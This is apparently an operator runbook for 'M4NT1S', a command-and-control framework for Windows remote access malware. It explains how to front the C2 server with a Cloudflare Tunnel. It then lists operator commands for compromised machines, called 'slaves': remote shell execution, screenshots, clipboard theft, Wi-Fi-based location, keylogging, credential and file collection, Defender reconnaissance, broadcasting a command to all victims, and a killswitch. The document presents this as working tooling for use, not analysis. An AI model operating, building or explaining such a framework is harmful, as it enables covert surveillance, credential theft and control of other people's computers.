# M4NT1S — Operator Runbook

Everything runs from `C:\M4NT1S\`. Data (`c2.db`, `slave_ids.json`,
`uploads/`) lives in `C:\M4NT1S\C2\` and is created on first run.

---

## 1. Cloudflare Tunnel Setup (one-time)

Dashboard: **https://dash.cloudflare.com**

1. Zero Trust → **Networks → Tunnels → Create a tunnel**
2. Choose **Cloudflared**, name it (e.g. `m4nt1s`)
3. Copy the install token shown. On Windows (elevated PowerShell):

   ```powershell
   cloudflared.exe service install <TOKEN>

## 2. Commands
   One-shots:
     <id> shell <cmd>       run cmd /c <cmd>
     <id> status            user / admin / host / uptime
     <id> sysinfo           domain / groups / adapters
     <id> screenshot        one-shot capture (opens in browser)
     <id> clipboard         current clipboard contents
     <id> locate            Wi-Fi scan

   Layers (each accepts 'exit' to return):
     <id> enter shell       live shell
     <id> enter collect     stream, keylog, files, creds
     <id> enter recon       processes, network, defender, tasks

   Cross-cutting:
     broadcast <cmd>        run same command on all active slaves
     KILLSWITCH             self-destruct all active slaves
     EXIT                   shutdown